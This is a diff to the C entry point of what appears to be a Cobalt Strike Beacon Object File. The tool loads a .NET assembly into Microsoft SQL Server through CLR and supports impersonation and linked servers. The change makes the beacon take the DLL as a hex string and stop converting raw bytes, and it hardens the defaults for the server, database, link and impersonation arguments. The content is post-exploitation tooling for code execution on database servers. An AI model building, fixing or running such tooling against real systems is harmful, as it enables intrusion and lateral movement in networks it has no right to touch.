@@ -224,12 +224,10 @@ VOID go(
 	char* impersonate;
 	char* function;
 	char* hash;
-	char* hexBytes;
-	LPBYTE lpDllBuffer = NULL;
-	DWORD dwDllBufferSize = 0;
+	char* hexBytes;  // DLL as hex string, not binary
 
 	//
-	// parse beacon args 
+	// parse beacon args - expecting hex string instead of bytes, using bytes crashes the beacon
 	//
 	datap parser;
 	BeaconDataParse(&parser, Buffer, Length);
@@ -239,12 +237,12 @@ VOID go(
 	impersonate = BeaconDataExtract(&parser, NULL);
 	function 	= BeaconDataExtract(&parser, NULL);
 	hash		= BeaconDataExtract(&parser, NULL);
-	lpDllBuffer = BeaconDataExtract(&parser, (int*)&dwDllBufferSize);
+	hexBytes	= BeaconDataExtract(&parser, NULL);
 
-	server = *server == 0 ? "localhost" : server;
-	database = *database == 0 ? "master" : database;
-	link = *link  == 0 ? NULL : link;
-	impersonate = *impersonate == 0 ?  NULL : impersonate;
+	server = (server && *server != 0) ? server : "localhost";
+	database = (database && *database != 0) ? database : "master";
+	link = (link && *link != 0) ? link : NULL;
+	impersonate = (impersonate && *impersonate != 0) ? impersonate : NULL;
 
 	if(!bofstart())
 	{
@@ -256,25 +254,7 @@ VOID go(
 		return;
 	}
 
-	//
-	// Convert the raw dll to hex string
-	//
-	hexBytes = (char*) intAlloc(dwDllBufferSize * 2 + 1);
-	if (hexBytes == NULL)
-	{
-		internal_printf("[!] Failed to allocate memory for hex conversion\n");
-		printoutput(FALSE);
-		return;
-	}
-
-	for (DWORD i = 0; i < dwDllBufferSize; i++)
-	{
-		MSVCRT$sprintf(hexBytes + (i * 2), "%02X", lpDllBuffer[i]);
-	}
-	hexBytes[dwDllBufferSize * 2] = '\0';
-
 	ExecuteClrAssembly(server, database, link, impersonate, function, hash, hexBytes);
-	intFree(hexBytes);
 	printoutput(TRUE);
 };
 
